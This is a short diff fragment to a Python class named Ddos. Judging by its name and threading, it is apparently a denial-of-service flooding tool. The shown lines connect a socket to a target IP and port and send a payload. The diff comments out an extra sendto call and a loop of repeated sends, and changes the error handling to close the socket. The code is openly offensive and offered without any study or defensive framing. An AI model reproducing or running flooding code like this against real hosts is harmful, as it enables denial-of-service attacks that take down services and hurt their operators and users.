@@ -70,7 +70,9 @@ class Ddos(Thread):
             try:
                 sock.connect((ip, port))
                 sock.send(message)
-                sock.sendto(message, (ip, port))
-            except socket.error as msg:
-                pass
+                #sock.sendto(message, (ip, port))
+                #for x in range(100):
+                #    s.send(data)
+            except:
+                sock.close()
 
